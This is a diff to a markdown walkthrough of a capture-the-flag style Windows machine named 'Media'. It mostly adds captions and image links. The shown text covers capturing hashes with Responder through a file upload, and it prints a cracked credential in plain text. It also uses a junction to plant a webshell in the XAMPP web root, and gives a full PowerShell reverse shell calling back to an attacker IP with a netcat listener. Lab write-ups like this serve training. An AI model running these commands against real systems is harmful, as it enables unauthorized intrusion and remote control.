@@ -65,7 +65,7 @@ Content-Type: text/html; charset=UTF-8
 
 scrolling at the bottom of the page there is a file upload feature that allows to upload windows media player compatible files:
 
-![](./screens/1.png)
+![](./screens/0.png)
 
 ---
 ## Foothold
@@ -150,12 +150,14 @@ Generation Complete.
 
 ```
 
+Starting the responder server
 ```
 sudo responder -I tun0
 ```
 
 uploading the file:
- img1
+
+![](./screens/1.png)
 
 ```
 [+] Listening for events...                                                                                         
@@ -235,7 +237,6 @@ Stopped: Sun Sep 27 07:43:01 2026
 
 enox:1234virus@
 
-
 ### ssh access as enox
 
 ```
@@ -284,6 +285,8 @@ enox@MEDIA C:\Users\enox\Desktop>
 ## Privilege Escalation
 
 ### Enumeration
+
+enumeration reveals a powershell script which references the upload directory hosted on the server
 
 ```
 enox@MEDIA c:\Users\enox>tree /f .
@@ -457,7 +460,7 @@ enox@MEDIA C:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49>
 
 uploading a webshell
 
-img 2
+![](./screens/2.png)
 
 ```shell
 Directory of c:\Windows\Tasks\Uploads
@@ -509,22 +512,26 @@ Cannot create a file when that file already exists.
 enox@MEDIA c:\Windows\Tasks\Uploads>rmdir ae9dc0285a79ec82ea1e2bfc009adf49
 ```
 
+Creating a simlink to add the webshell into the webserver root directory:
+
 ```
 enox@MEDIA c:\Windows\Tasks\Uploads>cmd /c mklink /J C:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49 C:\xampp\htdocs
 Junction created for C:\Windows\Tasks\Uploads\ae9dc0285a79ec82ea1e2bfc009adf49 <<===>> C:\xampp\htdocs
 ```
 
-reuploading the shell using the file uploading feature:
+reuploading the shell using the file uploading feature places the webshell into the root directory of the server:
 
-img 3
+![](./screens/3.png)
 
 reverse shell:
 
 ```powershell
 powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.15.80',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 ```
-img4
 
+![](./screens/4.png)
+
+Revshell achieved as nt authority\local service
 ```
 nc -lvnp 9001                
 listening on [any] 9001 ...
